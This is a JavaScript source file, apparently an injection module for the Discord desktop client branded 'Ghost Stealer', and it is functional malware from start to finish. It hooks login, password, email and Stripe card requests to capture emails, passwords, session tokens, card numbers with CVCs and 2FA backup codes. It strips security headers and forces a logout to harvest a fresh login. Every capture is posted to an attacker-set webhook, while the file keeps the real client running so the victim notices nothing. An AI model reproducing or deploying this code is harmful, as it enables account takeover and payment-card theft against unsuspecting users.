const fs = require('fs');
const GHOSTEALER = "https://st.depositphotos.com/1010338/3142/i/950/depositphotos_31420279-stock-photo-death-in-the-hood-concept.jpg";
const COLORSTEAL = "#2F3136";
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
    	return !0
    }
    fs.rmdirSync(path.join(__dirname, "Hazard"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})

const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(info) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}

function GetNitro(type) {
	if (type == 0) {
		return "No Nitro"
	}
	if (type == 1) {
		return "<:nitro:858231188325662770>"
	}
	if (type == 2) {
		return "<:nitro:858231188325662770> <:boost:933669372738805760>"
	} else {
		return "No Nitro"
	}
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "STAFF, "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "PARTNER, "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "HYPESQUAD EVENTS, "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "BUG HUNTER, "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "HYPESQUAD BRAVERY, "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "HYPESQUAD BRILLIANCE, "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "HYPESQUAD BALANCE, "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "EARLY SUPPORTER, "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "GOLD BUG HUNTER, "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "BOT DEVELOPER, "
	}
	if (badges == "") {
		badges = "None"
	}
	return badges
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff:874750808728666152> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:874750808678354964> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:hypesquad_events:874750808594477056> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:bughunter_1:874750808426692658> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:bughunter_2:874750808430874664> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:developer:874750808472825986> "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "Ghost Stealer",
            content: "",
            avatar_url: GHOSTEALER,
            embeds: [
                {
                    "color": COLORSTEAL,
                    "description": "**A USER STOLE**",
                    "fields": [
                        {
                            "name": "**E-MAIL**",
                            "value": email,
                            "inline": true
                        },
                        {
                            "name": "**PASSWORD**",
                            "value": password,
                            "inline": true
                        },
                        {
                            "name": "**NITRO**",
                            "value": GetNitro(json.premium_type),
                            "inline": true
                        },
                        {
                            "name": "**BADGES**",
                            "value": GetBadges(json.flags),
                            "inline": true
                        },
                        {
                            "name": "**TOKEN**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "???" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    },
                    "footer": {
                        "text": "Ghost Stealer"
                    }
                }
            ]
        };
        const hqlistt = {
          username: "Ghost Stealer",
          content: "",
          avatar_url: GHOSTEALER,
          embeds: [
	  {
            "color": COLORSTEAL,
            "description": `**HQ LIST** (\`${total_f(json)}\`)`,
            "fields": [
              {
                "name": "**RARE FRIENDS**",
                "value": calc_f(json),
                inline: true
	      }
            ],
            "author": {
              "name": json.username +"#" + json.discriminator + "???" + json.id,
              "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
            },
            "footer": {
              "text": "Ghost Stealer"
            }
	    }
          ]
        }
        SendToWebhook(JSON.stringify(params))
        SendToWebhook(JSON.stringify(hqlistt))
        if (token.startsWith('mfa')) {
          const mfaembed = {
            username: "Ghost Stealer",
            content: "",
            avatar_url: GHOSTEALER,
            embeds: [
	    {
              "color": COLORSTEAL,
              "description": `**2FA CODES**`,
              "fields": [
                {
                  "name": "**ALL CODES**",
                  "value": mfas(token),
                  inline: true
		}
              ],
              "author": {
                "name": json.username +"#" + json.discriminator + "???" + json.id,
                "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
              },
              "footer": {
                "text": "Ghost Stealer"
              }
	      }
            ]
          }
          SendToWebhook(JSON.stringify(mfaembed))
        }
    })
}

function total_f(fr) {
  var f = JSON.parse(fr)
	const r = f.filter((user) => {
    return user.type == 1
	})
	return r.length
}

function mfas(token) {
  var f = "";
  const window = BrowserWindow.getAllWindows()[0];
  window.webContents.executeJavaScript(`
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);
  xmlHttp.setRequestHeader('Content-Type', 'application/json');
  xmlHttp.setRequestHeader("Authorization", "${token}")
  xmlHttp.responseText`, !0).then((codes) => {
    var fieldo = [];
    var gayass = JSON.parse(codes)
		let g = gayass.backup_codes
		const r = g.filter((code) => {
		  return code.consumed == null
		})
		for (let z in r) {
		  fieldo.push(`\`${r[z].code.insert(4, "-")}\`\n`)
		}
    f += fieldo;
  })
  return f;
}

function calc_f(fr) {
  var f = JSON.parse(fr)
	const r = f.filter((user) => {
	  return user.type == 1
	})
	var gay = "";
	for (z of r) {
	  var b = GetRBadges(z.user.public_flags)
		if (b != "") {
		  gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
		}
	}
	if (gay == "") {
	  gay = "NO RARE FREINDS"
	}
	return gay
}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "Ghost Stealer",
            content: "",
            avatar_url: GHOSTEALER,
            embeds: [
                {
                    "color": COLORSTEAL,
                    "description": "**PASSWORD CHANGED**",
                    "fields": [
                        {
                            "name": "**E-MAIL**",
                            "value": json.email,
                            "inline": true
                        },
                        {
                            "name": "**OLD PASSWORD**",
                            "value": oldpassword,
                            "inline": true
                        },
                        {
                            "name": "**NEW PASSWORD**",
                            "value": newpassword,
                            "inline": true
                        },
                        {
                            "name": "**NITRO**",
                            "value": GetNitro(json.premium_type),
                            "inline": true
                        },
                        {
                            "name": "**BADGES**",
                            "value": GetBadges(json.flags),
                            "inline": true
                        },
                        {
                            "name": "**TOKEN**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "???" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    },
                    "footer": {
                        "text": "Ghost Stealer"
                    }                 
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Ghost Stealer",
            content: "",
            avatar_url: GHOSTEALER,
            embeds: [
                {
                    "color": COLORSTEAL,
                    "description": "**E-MAIL CHANGED**",
                    "fields": [
                        {
                            "name": "**NEW E-MAIL**",
                            "value": newemail,
                            "inline": true
                        },
                        {
                            "name": "**PASSWORD**",
                            "value": password,
                            "inline": true
                        },
                        {
                            "name": "**NITRO**",
                            "value": GetNitro(json.premium_type),
                            "inline": true
                        },
                        {
                            "name": "**BADGES**",
                            "value": GetBadges(json.flags),
                            "inline": true
                        },
                        {
                            "name": "**TOKEN**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "???" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    },
                    "footer": {
                        "text": "Ghost Stealer"
                    }                
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        var json = JSON.parse(info);
        var params = {
            username: "Ghost Stealer",
            content: "",
            avatar_url: GHOSTEALER,
            embeds: [
                {
                    "color": COLORSTEAL,
                    "description": "**CREDIT CARD ADDED**",
                    "fields": [
                        {
                            "name": "**CARD NUMBER**",
                            "VALUE": number,
                            "inline": true
                        },
                        {
                            "name": "**CARD CVC**",
                            "VALUE": cvc,
                            "inline": true
                        },
                        {
                            "name": "**CARD EXPIRATION DATE**",
                            "VALUE": `${expir_month}/${expir_year}`,
                            "inline": true
                        },
                        {
                            "name": "**NITRO**",
                            "value": GetNitro(json.premium_type),
                            "inline": true
                        },
                        {
                            "name": "**BADGES**",
                            "value": GetBadges(json.flags),
                            "inline": true
                        },
                        {
                            "name": "**TOKEN**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username + "#" + json.discriminator + "???" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    },
                    "footer": {
                        "text": "Ghost Stealer"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

const UrlFilter = {
	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
				Login(email, password, token)
			}))
		}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		}
	}
	if (details.url.endsWith("tokens")) {
		const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
	}
});
module.exports = require('./core.asar')
